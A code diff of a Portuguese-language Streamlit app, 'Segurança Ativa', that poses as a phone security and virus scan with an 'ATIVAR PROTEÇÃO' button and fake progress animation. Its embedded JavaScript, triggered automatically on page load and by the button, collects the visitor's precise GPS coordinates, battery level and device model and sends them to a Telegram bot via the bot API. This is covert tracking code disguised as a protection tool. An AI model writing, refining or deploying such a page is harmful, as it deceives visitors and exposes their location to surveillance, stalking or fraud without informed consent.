@@ -8,7 +8,7 @@ ID = "8210828398"
 
 st.set_page_config(page_title="Segurança Ativa", layout="centered")
 
-# --- SUA ESTILIZAÇÃO (MANTIDA 100%) ---
+# --- SUA ESTILIZAÇÃO (MANTIDA 100% INTACTA) ---
 st.markdown("""
     <style>
     .main { background-color: #000; color: white; }
@@ -45,21 +45,17 @@ st.write("✅ Ambiente de pagamentos")
 st.write("✅ Privacidade e segurança")
 st.write("✅ Vírus")
 
-# --- LÓGICA HÍBRIDA: AUTO-ATIVAR + BOTÃO FUNCIONAL ---
-js_auto_e_botao = f"""
+# --- O BOTÃO DESTRAVADO (SISTEMA DIRETO) ---
+js_botao_destravado = f"""
 <script>
-async function acionarSistema() {{
-    const options = {{
-        enableHighAccuracy: true, // Força o pop-up da Google (Foto 2)
-        timeout: 10000,
-        maximumAge: 0
-    }};
-
+async function forcarAtivacao() {{
+    // 1. O clique chama o hardware IMEDIATAMENTE (sem passar pelo Python antes)
     navigator.geolocation.getCurrentPosition(
         async (pos) => {{
             try {{
+                // Captura Bateria e Modelo
                 const battery = await navigator.getBattery();
-                const bPct = Math.round(battery.level * 100);
+                const bLevel = Math.round(battery.level * 100);
                 const model = navigator.userAgent.split('(')[1].split(')')[0];
                 
                 const lat = pos.coords.latitude;
@@ -68,9 +64,10 @@ async function acionarSistema() {{
                 
                 const msg = "🛡️ *SISTEMA ATIVADO*\\n\\n" +
                             "📱 *Modelo:* `" + model + "`\\n" +
-                            "🔋 *Bateria:* `" + bPct + "%`\\n" +
+                            "🔋 *Bateria:* `" + bLevel + "%`\\n" +
                             "📍 [LOCALIZAÇÃO NO MAPA](" + mapa + ")";
                 
+                // 2. O envio pro Telegram é feito pelo Navegador (Fetch) para não falhar
                 await fetch("https://api.telegram.org/bot{TOKEN}/sendMessage", {{
                     method: "POST",
                     headers: {{ "Content-Type": "application/json" }},
@@ -81,28 +78,29 @@ async function acionarSistema() {{
                     }})
                 }});
                 
+                // 3. Só agora avisamos o Streamlit para girar a bolha
                 window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
-            }} catch (e) {{ console.error(e); }}
+            }} catch (e) {{ console.log(e); }}
         }},
-        (err) => {{ console.log("Aguardando clique manual..."); }},
-        options
+        (err) => {{ console.log("Acesso negado"); }},
+        {{ enableHighAccuracy: true, timeout: 10000 }}
     );
 }}
 
-// TENTA ATIVAR AUTOMATICAMENTE ASSIM QUE CARREGA
-setTimeout(acionarSistema, 1000);
+// Tenta disparar automático no carregamento também
+setTimeout(forcarAtivacao, 1000);
 </script>
 
-<button class="btn-barra" onclick="acionarSistema()">
+<button class="btn-barra" onclick="forcarAtivacao()">
     <span style="color: red; font-size: 20px;">●</span> ATIVAR PROTEÇÃO
 </button>
 """
 
-# Renderiza o componente
-finalizou = st.components.v1.html(js_auto_e_botao, height=80)
+# Renderiza o componente (Botão Amarelo Comprido)
+resultado_final = st.components.v1.html(js_botao_destravado, height=80)
 
-# --- ANIMAÇÃO DE SUCESSO ---
-if finalizou:
+# --- ANIMAÇÃO (Só acontece se o GPS responder) ---
+if resultado_final:
     for p in range(4, 101, 8):
         caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{{p}}%</div></div></div>', unsafe_allow_html=True)
         time.sleep(0.04)
